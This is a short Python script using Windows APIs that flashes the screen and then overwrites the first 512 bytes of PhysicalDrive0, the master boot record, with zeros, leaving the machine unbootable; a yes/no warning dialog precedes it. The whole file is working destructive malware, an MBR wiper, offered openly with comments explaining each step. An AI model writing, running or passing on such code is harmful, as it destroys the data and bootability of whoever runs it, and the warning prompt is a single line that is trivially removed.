from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from win32file import *
from random import *
from sys import exit
# title of warning
warningtitle = 'Warning!'
# description of warning
warningdescription = 'This program will overwrite your MBR, making your machine unusable. If your in a safe enviroment (a virtual machine for example) and know what you\'re doing you might continute. Are you really sure you want to make your machine unbootable?'

if MessageBox(warningdescription, warningtitle, MB_ICONWARNING | MB_YESNO) == 7: # send warning and check if no is pressed
  exit() # exit the program

desk = GetDC(0)
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)

for i in range(0, 100): # range(0, <howmanytimestorepeat>)
    brush = CreateSolidBrush(RGB(
        0,
        0,
        255,
    ))
    SelectObject(desk, brush)
    PatBlt(desk, 0, 0, x, y, PATINVERT)
    DeleteObject(brush)
    Sleep(10)

hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create a handle to our Physical Drive
WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite the MBR! (Never run this on your main machine!)
CloseHandle(hDevice) # Close the handle to our Physical Drive!

MessageBox("Your MBR is overwritten!", "Oh No!", MB_ICONWARNING | MB_OK)

